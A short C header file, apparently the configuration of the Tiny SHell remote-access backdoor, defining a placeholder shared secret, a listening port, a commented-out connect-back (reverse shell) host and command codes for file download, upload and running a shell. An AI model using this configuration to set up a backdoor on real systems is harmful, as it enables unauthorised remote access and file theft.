#ifndef _TSH_H
#define _TSH_H

                /* Remember to leave a byte for the terminating NULL */
                /* 0123456789abcdef0123456789abcdef0123456789abcdef01234567890abcde */
char *secret = "DEFAULTDEFAULTDEFAULTDEFAULTDEF";
#define SERVER_PORT 9999

/*
#define CONNECT_BACK_HOST  "localhost"
#define CONNECT_BACK_DELAY 30
*/
#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */
